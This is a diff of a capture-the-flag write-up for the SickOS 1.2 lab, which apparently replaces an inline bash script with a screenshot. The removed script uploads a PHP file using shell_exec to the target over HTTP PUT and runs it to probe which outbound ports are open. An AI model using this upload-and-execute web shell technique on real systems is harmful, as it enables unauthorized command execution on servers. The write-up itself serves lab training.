@@ -59,31 +59,8 @@ done
 
  Hence i moved further and after spending too much time on it i wrote a permitted port detection script(runv1.sh)
 
- #!/bin/bash
-common_ports=(21 22 23 25 53 80 110 125 443 3128 8080 8443 8000 9000)
-#while : 
-#3do
-#read -p " ->" command;
+![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/802c7fa5-a096-4dd0-bbd8-438d5e1aaee8)
 
-
-for item in "${common_ports[@]}"; do
-
-nc -lp $item&
-nc_pid=$!
-command="nc -z -w1 192.168.146.164 $item 2>&1 && echo ****port $item seems permitted****|| echo port $item seems not permitted"
- echo "<?php echo shell_exec(\"$command\"); ?>" > run.php
-curl  http://192.168.146.174/test/ --upload-file run.php -H "Expect: "  
-sleep 1
-
-
-curl 192.168.146.174/test/run.php
-sleep 1
-kill $nc_pid &>/dev/null
-wait $nc_pid 2>/dev/null 
-
-done
-
-#done
 
 with these codes, uploaded file will run "command" value on the target system. so target server will send me nc packets(-z) and if the target permits a spesific port, we'll learn it.
 let's run it and see the result. After execution:
